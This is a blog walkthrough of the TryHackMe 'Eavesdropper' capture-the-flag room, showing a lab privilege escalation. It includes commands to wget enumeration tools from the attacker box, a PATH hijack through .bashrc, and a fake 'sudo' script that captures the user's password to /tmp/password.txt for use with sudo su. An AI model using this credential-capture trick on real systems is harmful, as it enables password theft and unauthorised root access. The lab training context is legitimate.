<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Eavesdropper Wreath is a Medium difficulty room available on TryHackMe. The main challenge focuses on your enumeration skills to find something you can listen to to uncover the root user&rsquo;s password.
Hints Room Hints Snoop the processes and see if you can find anything interesting. Can you hijack something to gain access? Walkthrough Full Walkthrough Task 1 - Download Keys For this task, make sure you Download the provided task files and save the SSH private key to a directory on your attacker box."><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Eavesdropper"><meta name=twitter:description content="Eavesdropper Wreath is a Medium difficulty room available on TryHackMe. The main challenge focuses on your enumeration skills to find something you can listen to to uncover the root user&rsquo;s password.
Hints Room Hints Snoop the processes and see if you can find anything interesting. Can you hijack something to gain access? Walkthrough Full Walkthrough Task 1 - Download Keys For this task, make sure you Download the provided task files and save the SSH private key to a directory on your attacker box."><meta property="og:title" content="Eavesdropper"><meta property="og:description" content="Eavesdropper Wreath is a Medium difficulty room available on TryHackMe. The main challenge focuses on your enumeration skills to find something you can listen to to uncover the root user&rsquo;s password.
Hints Room Hints Snoop the processes and see if you can find anything interesting. Can you hijack something to gain access? Walkthrough Full Walkthrough Task 1 - Download Keys For this task, make sure you Download the provided task files and save the SSH private key to a directory on your attacker box."><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2023-03-04-eavesdropper/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2023-03-04T00:00:00+00:00"><meta property="article:modified_time" content="2023-03-04T00:00:00+00:00"><title>Eavesdropper · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2023-03-04-eavesdropper/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.4f936f7daad2af2ad663469e77272baab2a7f6de967e8bb4d8964dfe1ee5b920.css integrity="sha256-T5NvfarSryrWY0aedycrqrKn9t6Wfou02JZN/h7luSA=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.111.1"></head><body class="preload-transitions colorscheme-light"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2023-03-04-eavesdropper/>Eavesdropper</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2023-03-04T00:00:00Z>March 4, 2023</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
3-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/try-hack-me/>Try Hack Me</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/eavesdropper/>Eavesdropper</a></span></div></div></header><div><h1 id=eavesdropper>Eavesdropper
<a class=heading-link href=#eavesdropper><i class="fa fa-link" aria-hidden=true></i></a></h1><p><a href=https://tryhackme.com/room/eavesdropper>Wreath</a> is a Medium difficulty room available on <a href=https://tryhackme.com>TryHackMe</a>. The main challenge focuses on your enumeration skills to find something you can listen to to uncover the root user&rsquo;s password.</p><h2 id=hints>Hints
<a class=heading-link href=#hints><i class="fa fa-link" aria-hidden=true></i></a></h2><details><summary><strong>Room Hints</strong></summary><ul><li>Snoop the processes and see if you can find anything interesting.<li>Can you hijack something to gain access?</ul></details><h2 id=walkthrough>Walkthrough
<a class=heading-link href=#walkthrough><i class="fa fa-link" aria-hidden=true></i></a></h2><details><summary><strong>Full Walkthrough</strong></summary><h3 id=task-1---download-keys>Task 1 - Download Keys
<a class=heading-link href=#task-1---download-keys><i class="fa fa-link" aria-hidden=true></i></a></h3><p>For this task, make sure you Download the provided task files and save the SSH private key to a directory on your attacker box. Complete this task once this has been done.</p><p><img src=/assets/img/Eavesdropper-1.png alt="Eavesdropper download SSH key"></p><h3 id=task-2---find-the-flag>Task 2 - Find the Flag
<a class=heading-link href=#task-2---find-the-flag><i class="fa fa-link" aria-hidden=true></i></a></h3><p>This task wants you to connect with the provided SSH keys and put your enumeration skills to the test to find a way to escalate privileges.</p><p><img src=/assets/img/Eavesdropper-2.png alt="Eavesdropper Task 2"></p><p>First, we need to change the permissions on the provided SSH key with:</p><p><code>chmod 600 idrsa.id-rsa</code></p><p><img src=/assets/img/Eavesdropper-3.png alt="Eavesdropper chmod ssh key"></p><p>Next, let&rsquo;s connect to the target machine as frank with:</p><p><code>ssh frank@&lt;target ip> -i idrsa.id-rsa</code></p><p><img src=/assets/img/Eavesdropper-4.png alt="Eavesdropper ssh Frank"></p><p>Next, let&rsquo;s copy linpeas over to the target machine. On your attacker machine, start an http server with python with:</p><p><code>python3 -m http.server</code></p><p><img src=/assets/img/Eavesdropper-5.png alt="Eavesdropper python http server"></p><p>Next, on your target machine, navigate to the /tmp directory and run:</p><p><code>wget http://&lt;attack machine ip>:8000/linpeas.sh</code></p><p><img src=/assets/img/Eavesdropper-6.png alt="Eavesdropper download linpeas"></p><p>Next, make it executable with:</p><p><code>chmod +x linpeas.sh</code></p><p>and then run it with:</p><p><code>./linpeas.sh</code></p><p>This did not return anything too useful. Let&rsquo;s follow this same process to move pspy64 over to the victim machine:</p><p><img src=/assets/img/Eavesdropper-7.png alt="Eavesdropper download pspy"></p><p>This returns some interesting inforamtion. It appears that there&rsquo;s an automated process that is logging in as frank via ssh, and then using cat to list the data in the /etc/shadow file:</p><p><img src=/assets/img/Eavesdropper-8.png alt="Eavesdropper pspy processes"></p><p>What is interesting about this is that it is running sudo without a full path, and it is currently located in /usr/bin, which is not the first entry in the $PATH variable.</p><p><img src=/assets/img/Eavesdropper-9.png alt="Eavesdropper cat PATH"></p><p>Let&rsquo;s modify this to add /tmp to the beginning by modifying the .bashrc file in frank&rsquo;s home directory.</p><p><img src=/assets/img/Eavesdropper-10.png alt="Eavesdropper modify .bashrc"></p><p>Next, we need to make an executable &ldquo;sudo&rdquo; file in the /tmp directory that can be used to capture credentials.</p><p>The code I used to capture the password is as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>read -sp <span style=color:#e6db74>&#34;Give me your password please: &#34;</span> password
</span></span><span style=display:flex><span>echo $password &gt; /tmp/password.txt
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;\n&#34;</span>
</span></span></code></pre></div><p><img src=/assets/img/Eavesdropper-11.png alt="Eavesdropper malicious sudo"></p><p>Next, in a second terminal window, I created another SSH session and logged in as frank:</p><p><img src=/assets/img/Eavesdropper-12.png alt="Eavesdropper frank 2nd SSH session"></p><p>As you can see in the screenshot above, /tmp is the first listing in the $PATH variable. Let&rsquo;s see if there&rsquo;s any information in the /tmp/password.txt file as we would expect with:</p><p><code>cat /tmp/password.txt</code></p><p><img src=/assets/img/Eavesdropper-13.png alt="Eavesdropper frank password"></p><p>We now have frank&rsquo;s password. Copy the value in the password.txt file and go back to your first ssh session and run:</p><p><code>sudo su</code></p><p>This will not work in the 2nd session since we hijacked the path, as it will try to run our malicious &ldquo;sudo&rdquo; file again. You could also specify the /usr/bin/sudo from the 2nd session to run the &ldquo;real&rdquo; sudo executable.</p><p><img src=/assets/img/Eavesdropper-14.png alt="Eavesdropper root access"></p><p>Next, navigate to the root user&rsquo;s home directory and print out the contents of the flag.txt file with:</p><p><code>cat flag.txt</code></p><p><img src=/assets/img/Eavesdropper-15.png alt="Eavesdropper root flag"></p></details></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2023
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>